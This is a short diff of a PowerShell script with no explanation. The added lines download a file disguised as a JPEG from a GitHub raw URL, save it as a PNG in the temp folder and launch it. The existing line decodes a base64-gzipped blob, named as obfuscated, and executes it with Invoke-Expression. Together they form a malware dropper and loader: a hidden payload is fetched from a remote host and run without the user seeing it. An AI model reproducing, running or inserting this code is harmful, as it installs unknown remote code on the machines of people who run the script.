@@ -1,1 +1,5 @@
+$wc = New-Object System.Net.WebClient;
+$wc.DownloadFile("https://raw.githubusercontent.com/jia891/112pulsarv/refs/heads/main/image.jpg", "$env:TEMP\1.png");
+Start-Process "$env:TEMP\1.png";
 $compressed = 'H4sIAAAAAAAA/6ySQWvcQAyF74H9D8IYnBDGrntKU/ZSNyWhdLPU3eTiy+xYjpWOZwaNvF7T9r8Xd1sI7bWXhxDSp/dANYq6Exy27AOyzKC2WnpIbj9Wu+um9p1MmrH5RIZ99J00j+RaP8WmGpnRyQNyJO+az6O7dwYTUBs9ICQ7K6wPhNMutFqW/oO2I0IW/IQce7QW1IlVy2wRbqlt0YHa+C37jiyCujmiGYW823pLZoZ3c9Axgqr8MGjXQkITgxoj7iHLepEQr4uC9ZQ/kfTjfozIxjtBJ7nxQ/FM+upNWZTl6zDaqPlQMHax6FG3sRg0uYJcFG1tHmKZZfAdCI9JBurLHBBqYXJPoD54Nrg66zzDeUqwhvItpATKIly9WsrLywv4tjoDgF8C6cgW1pD8D4PRpLS4S07ol5pOuK8soRNYwwYndb9/RiNQz1FwyDco+eOfid8b0TAFqU4OYP0Ckb/3k7Net6fU50uGi39v3rmD/4rq5hgY4/IGfzFXZz9+BgAA//9+FUKXYAIAAA=='; $bytes = [Convert]::FromBase64String($compressed); $ms = New-Object IO.MemoryStream(,$bytes); $gz = New-Object IO.Compression.GzipStream($ms,[IO.Compression.CompressionMode]::Decompress); $sr = New-Object IO.StreamReader($gz); $obfuscated = $sr.ReadToEnd(); Invoke-Expression $obfuscated
+
